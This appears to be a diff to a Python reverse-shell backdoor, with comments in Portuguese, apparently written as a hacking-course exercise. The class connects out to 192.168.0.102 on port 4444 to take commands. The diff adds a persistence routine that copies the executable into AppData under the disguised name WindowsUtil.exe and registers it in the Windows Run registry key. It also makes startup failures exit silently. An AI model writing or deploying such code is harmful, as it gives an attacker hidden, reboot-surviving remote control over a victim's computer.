@@ -1,11 +1,7 @@
-import socket
-import subprocess
-import json
-import os
-import base64
-
+import socket, subprocess, json, os, base64, sys, shutil
 class Backdoor:
     def __init__(self, ip, port):
+        self.save_on_startup()
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.connect((ip, port))
 
@@ -21,7 +17,11 @@ class Backdoor:
                 return json.loads(json_data)
             except ValueError:  # Se o json não estiver completo
                 continue
-
+    def save_on_startup(self):
+        location = os.environ["appdata"] + "\\WindowsUtil.exe"
+        if not os.path.exists(location):
+            shutil.copyfile(sys.executable, location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test / t REG_SZ /d "{}"'.format(location), shell=True)
     def change_directory(self, path):
         os.chdir(path)
         new_directory = os.getcwd()
@@ -67,6 +67,8 @@ class Backdoor:
     def stop(self):
         self.s.close()
 
-
-bckdr = Backdoor("192.168.0.102", 4444)
-bckdr.start()
+try:
+    bckdr = Backdoor("192.168.0.102", 4444)
+    bckdr.start()
+except Exception:
+    sys.exit()
